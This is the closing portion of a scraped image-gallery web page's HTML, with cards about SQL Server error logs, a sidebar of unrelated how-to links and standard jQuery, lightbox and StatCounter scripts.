+											<img class="card-img v-image" src="https://sqlserverhelpdotcom.files.wordpress.com/2011/06/log-folder.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTwplimE7kpHmYERwxx3z4nGxbTyqAVIUAF1IbB7wFokpKOF1MngFjl_OUU1aIH76ItbN0';" alt="Help : Where Is Sql Server Errorlog? « Help: Sql Server">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>Help : Where Is Sql Server Errorlog? « Help: </h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.mytechmantra.com/wp-content/uploads/2019/08/Configure-SQL-Server-Error-Logs.png" data-lightbox="roadtrip" title="How To Increase Number Of Sql Server Error Log Files - Mytechmantra.com ">
+											<img class="card-img v-image" src="https://www.mytechmantra.com/wp-content/uploads/2019/08/Configure-SQL-Server-Error-Logs.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuPsicslE5JVt62mVGLPL8s1CRcmuBVfVasImjIYM0u1L7q2woFtrTvg6UlrqnxhFrm6k';" alt="How To Increase Number Of Sql Server Error Log Files - Mytechmantra.com">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>How To Increase Number Of Sql Server Error Log Files - Mytechmantra.com </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+		</div>
+							</div>
+				</div> 
+				<div class="col-md-3">
+        <div class="col-sm-12 widget">
+        <h3 class="widget-title">Partnership</h3>
+					</div>
+					<div class="col-sm-12 widget">
+						<h3 class="widget-title">Popular Posts</h3>
+						<ul class="list-group">
+													<li class="list-group-item"><a href="/how-to-sell-an-item-on-ebay.html">How To Sell An Item On Ebay</a></li>
+													<li class="list-group-item"><a href="/how-to-sell-a-boat-in-md.html">How To Sell A Boat In Md</a></li>
+													<li class="list-group-item"><a href="/how-to-sell-my-story.html">How To Sell My Story</a></li>
+													<li class="list-group-item"><a href="/how-to-write-children-s-stories.html">How To Write Children S Stories</a></li>
+													<li class="list-group-item"><a href="/how-to-teach-implicit-differentiation.html">How To Teach Implicit Differentiation</a></li>
+													<li class="list-group-item"><a href="/how-to-take-care-of-a-ingrown-toenail.html">How To Take Care Of A Ingrown Toenail</a></li>
+													<li class="list-group-item"><a href="/how-to-sell-merch-on-myspace.html">How To Sell Merch On Myspace</a></li>
+													<li class="list-group-item"><a href="/how-to-restore-brain-cells.html">How To Restore Brain Cells</a></li>
+													<li class="list-group-item"><a href="/how-to-teach-fluency-in-reading.html">How To Teach Fluency In Reading</a></li>
+													<li class="list-group-item"><a href="/how-to-spot-a-borderline.html">How To Spot A Borderline</a></li>
+													<li class="list-group-item"><a href="/how-to-take-care-of-lips.html">How To Take Care Of Lips</a></li>
+													<li class="list-group-item"><a href="/how-to-restore-iphone-to-1-1-4.html">How To Restore Iphone To 1 1 4</a></li>
+													<li class="list-group-item"><a href="/how-to-take-care-of-newly-pierced-ears.html">How To Take Care Of Newly Pierced Ears</a></li>
+													<li class="list-group-item"><a href="/how-to-spot-a-fake-lesportsac.html">How To Spot A Fake Lesportsac</a></li>
+													<li class="list-group-item"><a href="/how-to-restore-the-partition-table.html">How To Restore The Partition Table</a></li>
+													<li class="list-group-item"><a href="/how-to-sell-used-computers.html">How To Sell Used Computers</a></li>
+													<li class="list-group-item"><a href="/how-to-sell-your-articles.html">How To Sell Your Articles</a></li>
+													<li class="list-group-item"><a href="/how-to-take-care-of-a-pregnant-dog.html">How To Take Care Of A Pregnant Dog</a></li>
+													<li class="list-group-item"><a href="/how-to-restore-i-touch.html">How To Restore I Touch</a></li>
+													<li class="list-group-item"><a href="/how-to-teach-improper-fractions.html">How To Teach Improper Fractions</a></li>
+						 
+						</ul>
+					</div>
+					<div class="col-sm-12 widget">
+					</br><!--ads/responsive.txt-->
+						<div class="d-block p-4">
+	<center>
+		<!-- SIDEBAR ADS -->
+	</center>
+</div>					</div>
+				</div> 
+				<div class="col-md-12 my-2" align="center">
+					<div class="d-block p-4">
+	<center>
+		<!-- BOTTOM BANNER ADS -->
+	</center>
+</div>				</div>
+			</div>
+			<div class="row footer">
+				<div class="col-md-12 text-center">
+					
+				</div>
+			</div>
+		</div>		
+	</main>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js" integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0=" crossorigin="anonymous"></script>	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js" integrity="sha256-CtKylYan+AJuoH8jrMht1+1PMhMqrKnB8K5g012WN5I=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/downloadjs/1.4.8/download.min.js"></script>
+	<!-- Footer CSS JS -->	
+	
+	
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/downloadjs/1.4.8/download.min.js"></script>
+	<script type='text/javascript'>
+		$(document).ready(function()
+	    {
+			$(document).on('click','#image-download',function(e)
+			{
+				e.preventDefault();
+				var url = $(this).data('url');
+				var title = $(this).data('title');			
+				var x=new XMLHttpRequest();
+				x.open( "GET", url , true);
+				x.responseType="blob";
+				x.onload= function(e){download(e.target.response, title, "image/jpg");};
+				x.send();
+			});
+	    });
+	</script>
+	<script type="text/javascript">
+var sc_project=12011803; 
+var sc_invisible=1; 
+var sc_security="ca0ad229"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="real time web
+analytics" href="https://statcounter.com/"
+target="_blank"><img class="statcounter"
+src="https://c.statcounter.com/12011803/0/ca0ad229/1/"
+alt="real time web analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+</body>
+</html>
